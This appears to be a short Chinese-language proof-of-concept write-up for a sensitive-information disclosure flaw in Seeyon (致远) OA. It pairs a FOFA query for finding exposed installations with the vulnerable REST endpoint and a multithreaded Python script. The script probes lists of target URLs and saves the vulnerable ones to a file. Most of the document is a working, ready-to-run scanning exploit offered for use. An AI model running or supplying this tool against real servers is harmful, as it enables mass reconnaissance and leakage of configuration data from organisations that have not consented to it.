FOFA

```markdown
app="致远互联-OA"
```

poc

```markdown
/seeyon/rest/m3/common/system/properties
```

![image-20240927172621173](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240927172621173.png)

py脚本

```python
import sys, requests, time, argparse, json, os
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
GREEN = '\033[92m'  # Green color
RESET = '\033[0m'  # Reset color

def banner():
    test = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-27
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OA restm3commonsystemproperties接口存在敏感信息泄露漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/seeyon/rest/m3/common/system/properties'
    url = target + payload

    try:
        res = requests.get(url=url, timeout=10, verify=False)
        res1 = json.loads(res.text)
        if res.status_code == 200 and res1.get('code') == 200 :
            print(f"[+]{GREEN}该网站存在敏感信息泄露漏洞: {RESET}{target}\n")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(target + '\n')
        else:
            print(f"[-]该网站不存在信息泄露漏洞")
    except Exception as e:
        print(f"[!]Error: {e}")
        # print(f"[*]该网站无法访问")

if __name__ == '__main__':
    main()
```

